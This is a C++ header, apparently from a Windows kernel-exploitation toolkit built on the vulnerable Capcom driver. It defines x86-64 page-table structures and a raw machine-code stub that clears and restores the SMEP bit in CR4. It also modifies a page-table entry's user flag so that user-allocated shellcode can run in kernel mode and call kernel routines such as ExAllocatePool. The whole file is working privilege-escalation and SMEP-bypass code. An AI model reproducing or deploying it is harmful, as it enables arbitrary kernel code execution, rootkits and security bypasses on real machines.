#pragma once
#include <intrin.h>
#include <iostream>
#include "KernelRoutines.h"
#include "LockedMemory.h"
#include "CapcomLoader.h"

#ifndef PFN_TO_PAGE
#define PFN_TO_PAGE(pfn) ( pfn << 12 )
#pragma pack(push, 1)
typedef union CR3_
{
	uint64_t value;
	struct
	{
		uint64_t ignored_1 : 3;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t ignored_2 : 7;
		uint64_t pml4_p : 40;
		uint64_t reserved : 12;
	};
} PTE_CR3;

typedef union VIRT_ADDR_
{
	uint64_t value;
	void *pointer;
	struct
	{
		uint64_t offset : 12;
		uint64_t pt_index : 9;
		uint64_t pd_index : 9;
		uint64_t pdpt_index : 9;
		uint64_t pml4_index : 9;
		uint64_t reserved : 16;
	};
} VIRT_ADDR;

typedef uint64_t PHYS_ADDR;

typedef union PML4E_
{
	uint64_t value;
	struct
	{
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t ignored_1 : 1;
		uint64_t reserved_1 : 1;
		uint64_t ignored_2 : 4;
		uint64_t pdpt_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PML4E;

typedef union PDPTE_
{
	uint64_t value;
	struct
	{
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t page_size : 1;
		uint64_t ignored_2 : 4;
		uint64_t pd_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PDPTE;

typedef union PDE_
{
	uint64_t value;
	struct
	{
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t page_size : 1;
		uint64_t ignored_2 : 4;
		uint64_t pt_p : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PDE;

typedef union PTE_
{
	uint64_t value;
	VIRT_ADDR vaddr;
	struct
	{
		uint64_t present : 1;
		uint64_t rw : 1;
		uint64_t user : 1;
		uint64_t write_through : 1;
		uint64_t cache_disable : 1;
		uint64_t accessed : 1;
		uint64_t dirty : 1;
		uint64_t pat : 1;
		uint64_t global : 1;
		uint64_t ignored_1 : 3;
		uint64_t page_frame : 40;
		uint64_t ignored_3 : 11;
		uint64_t xd : 1;
	};
} PTE;
#pragma pack(pop)
#endif


// Not thread safe!
using fnPassiveCall = uint64_t( *)( ... );

NON_PAGED_DATA static fnPassiveCall Khk_PassiveCallStub = 0;

static const uint32_t Kh_PassiveCallStubCallStoreOffset = 0x34;
static const uint32_t Kh_PassiveCallStubSmepEnabledOffset = 0xB;

NON_PAGED_DATA static UCHAR Kh_PassiveCallStubData[] =
{
	0x0F, 0x20, 0xE0,                                // mov    rax,cr4               ; -
	0x48, 0x0F, 0xBA, 0xE8, 0x14,                    // bts    rax,0x14              ; | will be nop'd if no SMEP support
	0x0F, 0x22, 0xE0,                                // mov    cr4,rax               ; -
	0xFB,                                            // sti
	0x48, 0x8D, 0x05, 0x07, 0x00, 0x00, 0x00,        // lea    rax,[rip+0x7]         ; continue
	0x8F, 0x40, 0x12,                                // pop    QWORD PTR [rax+0x12]  ; ret_store
	0x50,                                            // push rax
	0xFF, 0x60, 0x1A,                                // jmp    QWORD PTR [rax+0x1a]  ; call_store
	0xFA,                                            // cli
	0x0F, 0x20, 0xE1,                                // mov    rcx,cr4
	0x48, 0x0F, 0xBA, 0xF1, 0x14,                    // btr    rcx,0x14
	0x0F, 0x22, 0xE1,                                // mov    cr4,rcx
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,              // jmp    QWORD PTR [rip+0x0]   ; ret_store

	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // ret_store:  dq 0
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // call_store: dq 0
};



NON_PAGED_DATA static fnFreeCall Khk_ExAllocatePool = 0;
NON_PAGED_DATA static fnFreeCall Khk_MmGetVirtualForPhysical = 0;
NON_PAGED_DATA static PVOID Kh_ShellCodePage = 0;

template<typename ...Params>
NON_PAGED_CODE static uint64_t Khk_CallPassive( PVOID Ptr, Params &&... params )
{
	*( PVOID* ) ( ( ( PUCHAR ) Khk_PassiveCallStub ) + Kh_PassiveCallStubCallStoreOffset ) = Ptr;
	return Khk_PassiveCallStub( std::forward<Params>( params ) ... );
}

NON_PAGED_CODE static void Khk_AllocatePassiveStub()
{
	VIRT_ADDR Addr;
	Addr.pointer = Kh_ShellCodePage;
	PTE_CR3 Cr3 = { __readcr3() };

	auto Pml4e = ( PML4E * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Cr3.pml4_p ) + sizeof( PML4E ) * Addr.pml4_index );
	if ( !Pml4e || !Pml4e->present )
		return;
	auto Pdpte = ( PDPTE * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Pml4e->pdpt_p ) + sizeof( PDPTE ) * Addr.pdpt_index );
	if ( !Pdpte || !Pdpte->present )
		return;
	auto Pde = ( PDE * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Pdpte->pd_p ) + sizeof( PDE ) * Addr.pd_index );
	if ( !Pde || !Pde->present || Pde->page_size )
		return;
	auto Pte = ( PTE * ) Khk_MmGetVirtualForPhysical( PFN_TO_PAGE( Pde->pt_p ) + sizeof( PDE ) * Addr.pt_index );
	if ( !Pte || !Pte->present )
		return;

	Pte->user = FALSE;

	Khk_PassiveCallStub = fnPassiveCall( Kh_ShellCodePage );
	PVOID Out = ( PVOID ) Khk_CallPassive( Khk_ExAllocatePool, 0ull, sizeof( Kh_PassiveCallStubData ) );
	Np_memcpy( Out, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
	Khk_PassiveCallStub = ( fnPassiveCall ) Out;

	Pte->user = TRUE;
}

static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
{
	if ( Khk_PassiveCallStub )
		return;

	int CpuInfo[ 4 ];
	__cpuid( CpuInfo, 0x7 );
	
	if ( !( CpuInfo[ 1 ] & ( 1 << 7 ) ) ) // EBX : 1 << 7 = SMEP
	{
		printf( "[+] No SMEP support!\n" );
		memset( Kh_PassiveCallStubData, 0x90, Kh_PassiveCallStubSmepEnabledOffset );
	}

	Khk_ExAllocatePool = KrCtx->GetProcAddress<fnFreeCall>( "ExAllocatePool" );
	Khk_MmGetVirtualForPhysical = KrCtx->GetProcAddress<fnFreeCall>( "MmGetVirtualForPhysical" );

	Kh_ShellCodePage = VirtualAlloc( 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	memcpy( Kh_ShellCodePage, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
	VirtualLock( Kh_ShellCodePage, 0x1000 );

	CpCtx->ExecuteInKernel( Khk_AllocatePassiveStub );
	assert( Khk_PassiveCallStub );

	VirtualFree( Kh_ShellCodePage, 0, MEM_RELEASE );
}
